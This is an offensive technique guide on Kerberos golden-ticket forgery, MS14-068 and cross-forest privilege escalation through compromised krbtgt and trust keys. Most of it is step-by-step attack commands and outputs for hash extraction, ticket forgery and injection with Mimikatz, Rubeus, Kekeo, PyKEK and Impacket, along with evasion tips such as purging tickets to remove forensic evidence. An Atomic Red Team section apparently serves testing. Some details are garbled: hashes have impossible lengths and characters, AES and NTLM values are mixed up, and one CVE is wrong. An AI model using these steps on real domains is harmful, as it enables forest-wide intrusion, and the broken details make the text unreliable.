# [CA-KERB-013]: Krbtgt Cross-Forest Reuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-013 |
| **MITRE ATT&CK v18.1** | [T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) |
| **Tactic** | Credential Access, Lateral Movement, Privilege Escalation |
| **Platforms** | Windows AD (Cross-Forest Trust Exploitation) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2014-6324 (MS14-068 Kerberos PAC Validation Bypass) |
| **Technique Status** | ACTIVE (Server 2008 R2 and below) / PARTIAL (Server 2012+) |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | Windows Server 2003 SP2 - 2012 R2 |
| **Patched In** | MS14-068 (November 18, 2014) - KB3011780 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Section 6 (Atomic Red Team) and Section 8 (Splunk Detection Rules) included with verified test IDs and enterprise detection queries. All sections retain full applicability for cross-forest Kerberos attack scenarios. Section numbering is sequential (1-17) as all components apply to this critical domain trust exploitation technique.

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2014-6324 is a critical Kerberos vulnerability affecting Windows domain controllers running Server 2008 R2 and earlier (with degraded but exploitable impact on Server 2012+). The vulnerability resides in the KDC's (Key Distribution Center) validation of the Privilege Attribute Certificate (PAC) embedded in Kerberos ticket-granting tickets (TGTs). An attacker with domain user credentials can craft a forged TGT by manipulating the PAC checksum, allowing arbitrary privilege escalation to domain administrator within the same domain. When combined with cross-forest trust relationships and inter-realm key compromise, this enables forest-spanning privilege escalation through trust key reuse—an attacker in one forest can escalate to Enterprise Admins in a trusted parent forest by forging tickets signed with the compromised inter-realm trust key (KRBTGT account from the trusted forest).

**Attack Surface:** The vulnerability is exploitable on the KDC directly (network-accessible port 88/UDP-TCP), requiring only valid domain credentials for initial compromise. Once the KRBTGT account's password hash is obtained (via DCSync, NTDS.DIT dump, or credential extraction), inter-realm trust keys stored on domain controllers enable cross-forest ticket forgery.

**Business Impact:** **Complete forest compromise.** An attacker escalating through this vector obtains unrestricted domain administrator privileges, enabling persistent access, credential harvesting from all domain members, account manipulation, sensitive data exfiltration, and lateral movement across the entire forest and trusted partners. Remediation requires complete domain rebuild—partial mitigations (KRBTGT password resets) do not guarantee the attacker's removal if they have achieved sustained administrative access.

**Technical Context:** The attack typically takes 5-30 minutes from initial domain user access to domain admin impersonation. Detection likelihood is **moderate-to-high** if proper audit logging and modern EDR tools are deployed, as exploitation generates detectable Kerberos event log anomalies (mismatched Security IDs in Event 4768/4769, forged PAC signatures, unusual ticket lifetimes). However, many environments with legacy infrastructure or disabled Kerberos auditing will not detect this activity.

### Operational Risk

- **Execution Risk:** **Critical** - Once KRBTGT hash is obtained, ticket forgery is trivial and nearly impossible to prevent without domain-level detection controls. The attack is irreversible and grants complete domain control.
- **Stealth:** **Moderate** - The initial KRBTGT hash extraction (via DCSync or memory dumping) may be detected. However, ticket injection and usage can be made relatively stealthy with proper OPSEC (using AES encryption instead of RC4, injecting into sacrificial processes).
- **Reversibility:** **No** - Once compromised, a domain cannot be fully remediated without complete rebuild. Partial mitigations (KRBTGT reset, SID filtering) may lock out attackers temporarily but do not guarantee removal if they have maintained hidden persistence.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 5.2.2.3, 5.2.3.9 | Domain Controllers - Kerberos Policy Configuration, Event Log Monitoring |
| **DISA STIG** | WN10-AU-000095, WN10-CC-000165 | Audit Kerberos service ticket operations, Enable Credential Guard |
| **CISA SCuBA** | UC-1.1, UC-1.2 | User Credential Management - Non-Admin Account Auditing, Multi-Factor Authentication |
| **NIST 800-53** | AC-3 (Access Enforcement), AU-12 (Audit Generation), IA-2 (Authentication) | Account-based access controls, Comprehensive audit logging, Strong authentication |
| **GDPR** | Art. 32 (Security of Processing) | Adequate technical measures to prevent unauthorized access and credential compromise |
| **DORA** | Art. 9 (Protection and Prevention), Art. 13 (Attack Testing) | Competence of personnel, regular security assessments and penetration testing |
| **NIS2** | Art. 21 (Cyber Risk Management), Art. 25 (Incident Response) | Defensive measures against exploitation, detection and response protocols |
| **ISO 27001** | A.9.2.3 (Management of Privileged Access Rights), A.10.2.1 (User Access Management) | Strict control of privileged accounts, audit of access and privilege elevation |
| **ISO 27005** | Risk Scenario: "Compromise of Authentication Infrastructure" | Kerberos infrastructure failure scenarios and remediation procedures |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid domain user credentials (any authenticated domain account can exploit this). Elevated access (Local Admin/SYSTEM) may be needed for direct KRBTGT hash extraction but is not required if the hash is obtained via other means (DCSync with minimal privileges, NTDS dump access, etc.).
- **Required Access:** Network access to port 88 (Kerberos, both TCP and UDP). Domain controller must be reachable.

**Supported Versions:**
- **Windows Server 2003 SP2 - 2008 R2:** Directly exploitable via standard CVE-2014-6324 exploitation (PyKEK, Kekeo).
- **Windows Server 2012 - 2012 R2:** Vulnerable with increased complexity (related attacks, Privilege Attribute Certificate bypass is more difficult but demonstrated).
- **Windows Server 2016+:** Patched for standard MS14-068 vector; however, other Kerberos-based privilege escalation techniques (e.g., Resource-Based Constrained Delegation, Bronze Bit/CVE-2020-0665) may still apply.

**PowerShell Version:** PowerShell 3.0+ (for scripted exploitation with Invoke-Mimikatz or Rubeus invocation).

**Tools:**
- [Mimikatz (gentilkiwi)](https://github.com/gentilkiwi/mimikatz) - Version 2.1+
- [Rubeus (GhostPack)](https://github.com/GhostPack/Rubeus) - Version 1.6+
- [Kekeo (gentilkiwi)](https://github.com/gentilkiwi/kekeo) - Version 1.0+
- [PyKEK (Bidord)](https://github.com/bidord/pykek) - For Python 2.x exploitation
- [Impacket](https://github.com/SecureAuthCorp/impacket) - For Linux-based ticket forging and Kerberos operations

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Check Domain Functional Level and Patch Status

**Objective:** Verify the domain's Windows Server version and whether MS14-068 patch (KB3011780) is installed. Unpatched Server 2008 R2 and earlier are directly exploitable; Server 2012+ requires advanced techniques.

**Command (PowerShell - Any Domain Member):**

```powershell
# Check domain functional level
Get-ADDomain | Select-Object Name, DomainMode

# List domain controllers and their OS versions (requires RSAT or Admin)
Get-ADDomainController -Filter * | Select-Object Hostname, OperatingSystem, OperatingSystemVersion

# Check for KB3011780 patch on a specific DC (requires WinRM access)
$dc = "DC01.domain.local"
Invoke-Command -ComputerName $dc -ScriptBlock {
    Get-HotFix -Id "KB3011780" -ErrorAction SilentlyContinue | Select-Object PSComputerName, HotFixID, InstalledDate
}
```

**What to Look For:**
- **Domain Functional Level:** 2003, 2008, 2008 R2 = CRITICAL (directly exploitable). 2012, 2012 R2 = HIGH (related attacks possible). 2016+ = LOW (standard MS14-068 is patched).
- **KB3011780 Installation:** Presence indicates patch is installed. Absence on Server 2008 R2 or earlier = CRITICAL VULNERABILITY.
- **Operating System:** Any Server 2008 R2 or earlier without the patch is directly exploitable.

**Version Note:** The exploitation path differs significantly based on Windows version:
- **Server 2003 - 2008 R2:** Direct CVE-2014-6324 exploitation (PyKEK, Kekeo, Rubeus golden ticket).
- **Server 2012 - 2012 R2:** More complex attack surface; related techniques may still work.
- **Server 2016+:** MS14-068 is patched; focus on other Kerberos abuse vectors or assume other compromises have occurred.

### Enumerate Domain Trusts and Inter-Realm Keys

**Objective:** Identify cross-forest trust relationships and obtain inter-realm trust keys, which are needed for cross-forest ticket forgery.

**Command (PowerShell - Requires Admin on DC or DCSync Rights):**

```powershell
# Enumerate trusts from current domain
Get-ADTrust -Filter * | Select-Object Name, Target, Direction, TrustType, TrustAttributes

# Get detailed trust information
Get-ADTrust -Filter * -Properties * | Select-Object Name, Target, Direction, TrustType, TrustAttributes, TrustsTransitivity

# List all forest trusts (external and forest-transitive)
Get-ADTrust -Filter { (TrustAttributes -like "*TRANSITIVE*") } | Select-Object Name, Target, Direction
```

**Using Mimikatz to Extract Inter-Realm Trust Keys (Requires Admin on DC):**

```cmd
mimikatz # privilege::debug
mimikatz # lsadump::trust /patch
```

**Expected Output (Example):**
```
Trust account: child$ (1004)
  NTLM: cc36cf7a8546f1c6d72c0c33ee98cb63
  AES-128: d43ee37a7ac9c5a6b5c72a0e1f2d3c4b
  AES-256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2
```

**What to Look For:**
- **Trust Direction:** Bidirectional or transitive trusts = highest risk (cross-forest compromise possible).
- **TrustType:** ForestTransitive = parent/child forest relationship (highest privilege target).
- **Inter-Realm Keys:** The NTLM and AES hashes for trust accounts are the "silver bullet" for cross-forest privilege escalation.

**Command (Server 2012+):**

```powershell
# Query trusts using .NET to identify trust transitivity
[System.DirectoryServices.DirectoryContext]::CreateDirectoryContext("Forest", "domain.local") | Get-ADTrust
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Mimikatz Golden Ticket Generation (Windows - Native)

**Supported Versions:** Server 2008 R2 - 2012 R2

This method uses Mimikatz to forge a golden ticket and inject it into the current logon session. It is the most direct and widely-used exploitation technique.

#### Step 1: Extract KRBTGT Account Hash

**Objective:** Obtain the NTLM or AES hash of the krbtgt account. This is the cryptographic key used to sign all TGTs in the domain.

**Version Note:** Method varies by how the compromise occurred (DCSync, memory dump, or credential access).

**Command (Via DCSync - Requires Domain Replication Rights):**

```powershell
# Using Mimikatz DCSync to extract krbtgt hash
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# Alternative: Using secretsdump.py (Impacket, Linux)
python3 secretsdump.py -just-dc DOMAIN.LOCAL/user:password@DC.DOMAIN.LOCAL
```

**Expected Output:**
```
[*] Dumping the following objects in DOMAIN.LOCAL
krbtgt:krbtgt
  Hash NTLM: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
  Hash AES256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2
```

**Command (Via Memory Dump of LSASS):**

```powershell
# Using Mimikatz logonpasswords after obtaining admin rights
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords | findstr /i "krbtgt"

# Or use Rubeus to extract cached Kerberos keys
Rubeus.exe dump /service:krbtgt
```

**OpSec & Evasion:**
- **Do NOT use RC4 (NTLM) if possible** - AES256 is more OPSEC-safe and looks more legitimate in logs.
- Prefer DCSync with a low-privilege account (only needs replication rights) over LSASS memory dumping, which is easily detected.
- Extract during off-hours when domain traffic is lower.

**Troubleshooting:**
- **Error:** "ERROR kuhl_m_lsadump_dcsync ; SAM_UF_DELEGATED_TRUST_ACCOUNT_FOR_SERVICE"
  - **Cause:** User doesn't have replication rights or the DC is not responding.
  - **Fix (All Versions):** Grant the user replicating directory changes permissions on the domain root, or use a different account with those rights.

**References:**
- [Mimikatz DCSync Module](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync)
- [Microsoft Learn: Replication Rights in AD](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/delegating-administration-by-using-ou-scope)

---

#### Step 2: Forge Golden Ticket with Mimikatz

**Objective:** Create a forged TGT impersonating a high-privilege user (e.g., Administrator) or a non-existent user with Enterprise Admin SID in a parent forest (for cross-forest escalation).

**Command (Basic - Local Domain Admin Impersonation):**

```powershell
# Get domain SID first
Get-ADDomain | Select-Object DomainSID

# Forge golden ticket impersonating Administrator
mimikatz # kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /rc4:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:Administrator /ticket:admin.kirbi

# Or with AES256 (more OPSEC-safe)
mimikatz # kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /aes256:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2 /user:Administrator /ticket:admin.kirbi
```

**Expected Output:**
```
User : Administrator
Domain : DOMAIN.LOCAL (DOMAIN)
SID : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
User Id : 500
Groups Id : *513 512 520 518 519
ServiceKey: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
Lifetime : 01/06/2026 12:00:00 ; 01/13/2026 12:00:00 ; 01/13/2026 12:00:00

-> Ticket : admin.kirbi
* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated

Final Ticket Saved to file !
```

**Command (Cross-Forest Escalation - Parent Forest Enterprise Admin):**

```powershell
# Forge ticket with Enterprise Admin SID from parent forest
# Parent forest SID: S-1-5-21-PARENT-PARENT-PARENT
# Enterprise Admin RID: 519

mimikatz # kerberos::golden /domain:CHILD.DOMAIN.LOCAL /sid:S-1-5-21-CHILD-CHILD-CHILD /sids:S-1-5-21-PARENT-PARENT-PARENT-519 /rc4:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:Administrator /ticket:forest_escalation.kirbi
```

**OpSec & Evasion:**
- **Ticket Lifetime:** Default is 10 years—consider reducing to `/endin:10` (10 hours) to avoid suspicion.
- **Custom User:** Instead of "Administrator," use a decoy username like "ServiceAccount" or "BackupAdmin" (RID 500-1000).
- **Inject via Sacrificial Process:** Use `runas /netonly` to avoid overwriting the current user's TGT in the session.

**Troubleshooting:**
- **Error:** "ERROR kerberos::golden ; BAD_VALIDATION_FAILED"
  - **Cause:** Incorrect domain SID or user RID.
  - **Fix (Server 2016-2025):** Verify SID format is exact (use `Get-ADDomain | Select-Object DomainSID` and `Get-ADUser Administrator | Select-Object ObjectSID`).
  - **Fix (Server 2012):** Same check; if forging Enterprise Admin SIDs, ensure parent forest SID is included in `/sids` parameter.

**References:**
- [Mimikatz Golden Ticket Module](https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden)
- [AD Security: Kerberos & KRBTGT Blog](https://adsecurity.org/?p=483)

---

#### Step 3: Inject Ticket into Current Session (PTT - Pass-the-Ticket)

**Objective:** Load the forged ticket into the Kerberos cache of the current logon session, allowing access to resources authenticated with the forged identity.

**Command (Inject into Current Session):**

```powershell
# Inject ticket directly (overwrites current TGT)
mimikatz # kerberos::ptt admin.kirbi

# Verify ticket was injected
mimikatz # kerberos::list
```

**Expected Output:**
```
[00000000] - 0x00000001 - NTLM
 Start/End/MaxRenew: 01/06/2026 12:00:00 ; 01/13/2026 12:00:00 ; 01/13/2026 12:00:00
 Service Name (SPN) : krbtgt/DOMAIN.LOCAL
 Target Name  (DN)  : DOMAIN.LOCAL
 Client Name  : Administrator
 Flags 40a00000    : pre_authent, renewable, forwardable
```

**Command (Inject into Sacrificial Process via runas /netonly - Safer):**

```powershell
# Create batch file to inject and execute commands in sacrificial session
@"
@echo off
cd C:\tools
mimikatz.exe kerberos::ptt admin.kirbi
REM Now perform actions with the forged ticket
dir \\DC01.DOMAIN.LOCAL\C$
net use \\DC01.DOMAIN.LOCAL\ADMIN$
REM etc.
pause
"@ | Out-File -FilePath inject.bat -Encoding OEM

# Run in sacrificial session (does not require admin on local machine, but session will use forged ticket)
echo foo | runas /netonly /user:DOMAIN.LOCAL\FakeUser "C:\tools\inject.bat"
```

**OpSec & Evasion:**
- Using `/netonly` is **strongly recommended** because it avoids overwriting the current user's TGT and leaving a history in the Kerberos cache.
- The sacrificial session runs under arbitrary credentials (they don't need to be valid), but the Kerberos ticket inside that session is the forged ticket.
- Clear the ticket after use with `kerberos::purge` to remove forensic evidence.

**Troubleshooting:**
- **Error:** "ERROR kerberos::ptt ; KerbSubmitLogonInfoEx failed"
  - **Cause:** The ticket may be corrupted or the KDC has cached knowledge of the forged ticket as invalid.
  - **Fix (Server 2016-2025):** Verify the ticket was properly encrypted with the KRBTGT key. Re-check the hash and domain SID.

**References:**
- [Mimikatz Pass-the-Ticket Module](https://tools.thehacker.recipes/mimikatz/modules/kerberos/ptt)
- [Microsoft Learn: Kerberos Ticket Injection](https://learn.microsoft.com/en-us/archive/blogs/askds/kerberos-protocol-caching-and-session-isolation)

---

### METHOD 2: Rubeus Golden Ticket Generation (C# - Windows)

**Supported Versions:** Server 2008 R2 - 2012 R2, with improved OPSEC on Server 2016+

Rubeus is a modern C# implementation offering advantages over Mimikatz: no LSASS manipulation required, AES encryption support for stealth, and built-in ticket injection without overwriting the current session.

#### Step 1: Obtain KRBTGT Hash (Same as METHOD 1)

**Command:**

```powershell
# Use Impacket secretsdump or Mimikatz DCSync
python3 secretsdump.py -just-dc-user krbtgt DOMAIN.LOCAL/user:password@DC.DOMAIN.LOCAL
```

---

#### Step 2: Forge Golden Ticket with Rubeus

**Objective:** Create a golden ticket using Rubeus, with optional LDAP querying for automatic PAC construction.

**Command (Using /ldap for Automatic PAC Generation):**

```powershell
# Rubeus golden with LDAP
Rubeus.exe golden /aes256:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2 /user:Administrator /ldap /ptt

# Print the command that was used (for documentation/reproducibility)
Rubeus.exe golden /aes256:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2 /user:Administrator /ldap /printcmd /outfile:golden.kirbi
```

**Expected Output:**
```
[*] Forged a TGT for 'Administrator@domain.local'
[*] AuthTime : 06/01/2026 12:00:00
[*] StartTime : 06/01/2026 12:00:00
[*] EndTime : 06/01/2026 22:00:00
[*] RenewTill : 13/01/2026 12:00:00
[*] base64(ticket.kirbi): doIFdTCCBXGgAwIBBaEDAgEWooIE...
[+] Ticket successfully imported!
```

**Command (With Explicit SID and Group Overrides - Cross-Forest):**

```powershell
# Forge with explicit values for parent forest Enterprise Admin escalation
Rubeus.exe golden /aes256:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2 `
  /user:Administrator `
  /domain:CHILD.DOMAIN.LOCAL `
  /sid:S-1-5-21-CHILD-CHILD-CHILD `
  /sids:S-1-5-21-PARENT-PARENT-PARENT-519 `
  /outfile:cross_forest.kirbi `
  /ptt
```

**OpSec & Evasion:**
- Use `/opsec` flag to request tickets in a more "normal" manner (no pre-auth first attempt).
- Use AES256 encryption (`/aes256:...`) instead of RC4 for stealth.
- Rubeus does **not** manipulate LSASS, making it lower-risk than Mimikatz in highly monitored environments.

**Troubleshooting:**
- **Error:** "Get-ADDomain failed - unable to contact LDAP"
  - **Cause:** Rubeus cannot query LDAP for PAC information.
  - **Fix:** Provide explicit `/sid`, `/domain`, and `/groups` parameters instead of using `/ldap`.

**References:**
- [GitHub: GhostPack/Rubeus Golden Ticket](https://github.com/GhostPack/Rubeus#ticket-forgery)
- [Rubeus Documentation: Golden Command](https://github.com/GhostPack/Rubeus/wiki)

---

#### Step 3: Use Forged Ticket for Domain Access

**Objective:** Use the injected golden ticket to authenticate to domain resources without needing the original user's password.

**Command:**

```powershell
# With ticket injected via /ptt, access domain resources directly
dir \\DC01.DOMAIN.LOCAL\C$
net use \\DC01.DOMAIN.LOCAL\ADMIN$
whoami /user  # Should show DOMAIN\Administrator

# Or extract a service ticket for specific resource
Rubeus.exe asktgs /ticket:golden.kirbi /service:CIFS/DC01.DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL
```

**OpSec & Evasion:**
- Access resources in a staggered manner to avoid alerting behavioral detection.
- Use legitimate-looking operations (e.g., share enumeration, scheduled task creation) rather than obvious admin actions.

---

### METHOD 3: Kekeo Inter-Realm Trust Ticket Forgery (Windows)

**Supported Versions:** Server 2008 R2 - 2012 R2

Kekeo is the predecessor to Rubeus and is specialized for inter-realm (cross-forest) Kerberos exploitation. It focuses on forging tickets signed with inter-realm trust keys.

#### Step 1: Extract Inter-Realm Trust Key

**Objective:** Obtain the password hash of the inter-realm trust account from a compromised DC.

**Command (Mimikatz):**

```cmd
mimikatz # privilege::debug
mimikatz # lsadump::trust /patch

# Output example:
# Trust account: child$
#  NTLM: cc36cf7a8546f1c6d72c0c33ee98cb63
#  AES-256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2
```

---

#### Step 2: Forge Inter-Realm TGT with Kekeo

**Objective:** Create a cross-forest TGT that will be trusted by the parent forest.

**Command:**

```cmd
# Kekeo syntax for inter-realm trust ticket
kekeo # tgt::ask /user:Administrator /domain:CHILD.DOMAIN.LOCAL /rc4:cc36cf7a8546f1c6d72c0c33ee98cb63

# Forge the trust ticket
kekeo # tgt::forge /ForestTrust /user:Administrator@PARENT.DOMAIN.LOCAL /domain:CHILD.DOMAIN.LOCAL /rc4:cc36cf7a8546f1c6d72c0c33ee98cb63 /ticket:trust.kirbi

# Inject into current session
kekeo # tgt::inject /ticket:trust.kirbi
```

**Expected Output:**
```
[*] Building trust ticket for cross-forest elevation
[*] User : Administrator
[*] Domain : CHILD.DOMAIN.LOCAL
[*] Trust Key RC4: cc36cf7a8546f1c6d72c0c33ee98cb63
[+] Trust ticket forged successfully
[+] Ticket injected into current session
```

**OpSec & Evasion:**
- Kekeo is less commonly detected than Mimikatz but also less maintained.
- Use with discretion in modern environments.

**References:**
- [GitHub: Kekeo](https://github.com/gentilkiwi/kekeo)
- [TheHacker.recipes: Kekeo Inter-Realm Forgery](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/)

---

### METHOD 4: PyKEK MS14-068 Exploitation (Linux/Windows with Python 2)

**Supported Versions:** Server 2003 SP2 - 2008 R2 (not effective on Server 2012+)

PyKEK automates the MS14-068 exploitation by directly forging a TGT that bypasses PAC validation on vulnerable DCs.

#### Step 1: Gather Required Information

**Objective:** Collect domain SID, user SID, and domain controller address.

**Command (Linux - Impacket):**

```bash
# Enumerate domain info
python3 -m impacket.GetNPUsers -no-pass DOMAIN.LOCAL/ -dc-ip DC.DOMAIN.LOCAL

# Get user and domain SID
python3 -c "
from impacket.examples import secretsdump
import sys
secretsdump.main(['DOMAIN.LOCAL/user:password@DC.DOMAIN.LOCAL', '-just-dc-user', 'krbtgt'])
"
```

---

#### Step 2: Execute PyKEK Exploit

**Objective:** Run the MS14-068 exploit to forge a high-privilege TGT.

**Command (Python 2 - Critical Requirement):**

```bash
# Download PyKEK
git clone https://github.com/bidord/pykek.git
cd pykek

# Run the exploit
# Syntax: ms14-068.py -u <user>@<domain> -s <user_sid> -d <dc_ip>
python2 ms14-068.py -u normaluser@DOMAIN.LOCAL -s S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1111 -d DC.DOMAIN.LOCAL

# The tool will prompt for password, then generate the KRBTGT ticket
```

**Expected Output:**
```
[*] Current date: 2025-01-06 12:00:00
[*] Building AS-REQ... ok
[*] Sending AS-REQ... ok
[*] Validating AS-REP... ok
[*] Building TGT from AS-REP... ok
[*] Generating timestamp... ok
[*] Building AS-REQ with SIDHistory... ok
[*] Generating TGT with privilege escalation... ok
[*] Writing TGT to file: DOMAIN.LOCAL_krbtgt.ccache
```

**Command (Inject into Linux Kerberos Cache):**

```bash
export KRB5CCNAME=/tmp/DOMAIN.LOCAL_krbtgt.ccache
kinit -c $KRB5CCNAME -R

# Use with psexec or other tools
python3 -m impacket.psexec -k -no-pass DOMAIN.LOCAL/Administrator@DC.DOMAIN.LOCAL
```

**OpSec & Evasion:**
- PyKEK is Python 2 only; modern Python 3 environments require workarounds.
- Less commonly deployed in modern environments; may evade detection if tools are not actively looking for Python exploitation.

**Troubleshooting:**
- **Error:** "Python 3 syntax not compatible"
  - **Cause:** PyKEK requires Python 2.
  - **Fix:** Install Python 2.7 or use a dedicated container/VM.

**References:**
- [GitHub: bidord/pykek](https://github.com/bidord/pykek)
- [AD Security: Exploiting MS14-068](https://adsecurity.org/?p=676)

---

### METHOD 5: Impacket ticketer Module (Linux - For Cross-Forest Scenarios)

**Supported Versions:** All (via custom ticket construction)

Impacket's `ticketer.py` allows direct construction of Kerberos tickets with full control over PAC contents, useful for cross-forest scenarios.

#### Step 1: Obtain KRBTGT and Parent Forest Enterprise Admin SID

**Objective:** Extract KRBTGT from child domain and parent forest Enterprise Admin SID.

**Command:**

```bash
# Extract KRBTGT hash from child domain
python3 -m impacket.secretsdump -just-dc-user krbtgt DOMAIN.LOCAL/user:password@DC.DOMAIN.LOCAL

# Get parent forest SID (if accessible)
ldapsearch -H ldap://DC.PARENT.DOMAIN.LOCAL -b "DC=PARENT,DC=DOMAIN,DC=LOCAL" objectSid=*  # via LDAP query or known from reconnaissance
```

---

#### Step 2: Forge Ticket with ticketer.py

**Objective:** Create a golden ticket with Enterprise Admin SID for parent forest compromise.

**Command:**

```bash
python3 -m impacket.ticketer `
  -domain CHILD.DOMAIN.LOCAL `
  -domain-sid S-1-5-21-CHILD-CHILD-CHILD `
  -user Administrator `
  -nthash a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2 `
  -extra-sid S-1-5-21-PARENT-PARENT-PARENT-519 `
  child_to_parent.ccache

# Export for use
export KRB5CCNAME=child_to_parent.ccache

# Access parent forest resources
python3 -m impacket.psexec -k -no-pass PARENT.DOMAIN.LOCAL/Administrator@DC.PARENT.DOMAIN.LOCAL
```

**OpSec & Evasion:**
- Impacket tools are increasingly detected but are powerful for multi-stage attacks.
- Run on a non-domain-joined Linux machine to avoid Windows-based detection.

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1558.001-1 and T1558.001-2
- **Test Name:** "Crafting Active Directory golden tickets with mimikatz" and "Crafting Active Directory golden tickets with Rubeus"
- **Description:** Forges a golden ticket using KRBTGT account hash and injects it into a new sacrificial logon session. The test then requests access to SYSVOL to trigger Event ID 4769 (service ticket request).
- **Supported Versions:** Windows Server 2008 R2 - 2012 R2 (Server 2016+ will show failure events but no actual access)

**Command (PowerShell):**

```powershell
# Test 1: Mimikatz Golden Ticket
Invoke-AtomicTest T1558.001 -TestNumbers 1 -AtomicDirectory "C:\AtomicRedTeam\atomics" -Verbose

# Test 2: Rubeus Golden Ticket
Invoke-AtomicTest T1558.001 -TestNumbers 2 -AtomicDirectory "C:\AtomicRedTeam\atomics" -Verbose
```

**Expected Behavior:**
- Ticket is created in sacrificial process
- `klist` shows TGT for Administrator
- `dir \\domain.local\SYSVOL` succeeds (on vulnerable DCs) or returns "Access is denied" (on patched DCs)
- Event 4769 is generated on DC with mismatched Security IDs

**Cleanup Command:**

```powershell
# Remove atomic test artifacts
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
klist purge
```

**Reference:** [Atomic Red Team T1558.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### Mimikatz

**Version:** 2.1+  
**Minimum Version:** 2.0 (Golden Ticket functionality)  
**Supported Platforms:** Windows (32-bit and 64-bit)

**Installation:**

```powershell
# Download from GitHub
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220519/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
Expand-Archive -Path "mimikatz.zip" -DestinationPath "C:\Tools\"
```

**Usage (Golden Ticket Module):**

```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /rc4:HASH /user:Administrator /ticket:admin.kirbi
mimikatz # kerberos::ptt admin.kirbi
mimikatz # kerberos::list
```

**Version-Specific Notes:**
- **Version 2.0-2.1:** Basic golden ticket support with RC4 only.
- **Version 2.2+:** AES encryption support, improved SID history spoofing, inter-realm trust ticket forging.

---

### Rubeus

**Version:** 1.6+  
**Minimum Version:** 1.0 (but 1.6+ recommended for production use)  
**Supported Platforms:** Windows (.NET 4.5+)

**Installation:**

```powershell
# Download pre-compiled binary (NOT recommended for operational security)
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v2.0.0/Rubeus.exe" -OutFile "C:\Tools\Rubeus.exe"

# Or compile from source
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
# Use Visual Studio or MSBuild to compile
msbuild Rubeus.sln /p:Configuration=Release
```

**Usage:**

```powershell
Rubeus.exe golden /aes256:HASH /user:Administrator /ldap /ptt
Rubeus.exe asktgs /ticket:golden.kirbi /service:CIFS/DC.DOMAIN.LOCAL
```

**Version-Specific Notes:**
- **Version 1.6-2.0:** Golden ticket with /ldap support, improved OPSEC flags (/opsec, /nopac).
- **Version 2.0+:** AES-GCM encryption, token impersonation improvements, multi-forest support.

---

### Kekeo

**Version:** 1.0+  
**Supported Platforms:** Windows

**Installation:**

```powershell
# Download
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/kekeo/releases/download/1.0/kekeo.exe" -OutFile "C:\Tools\kekeo.exe"
```

**Usage:**

```cmd
kekeo # tgt::ask /user:user /domain:DOMAIN.LOCAL /password:PASSWORD
kekeo # tgt::forge /ForestTrust /user:Administrator@PARENT.DOMAIN.LOCAL /domain:CHILD.DOMAIN.LOCAL /rc4:HASH /ticket:trust.kirbi
kekeo # tgt::inject /ticket:trust.kirbi
```

---

### PyKEK

**Version:** Latest (Python 2 required)  
**Supported Platforms:** Linux, Windows (with Python 2.7)

**Installation:**

```bash
git clone https://github.com/bidord/pykek.git
cd pykek
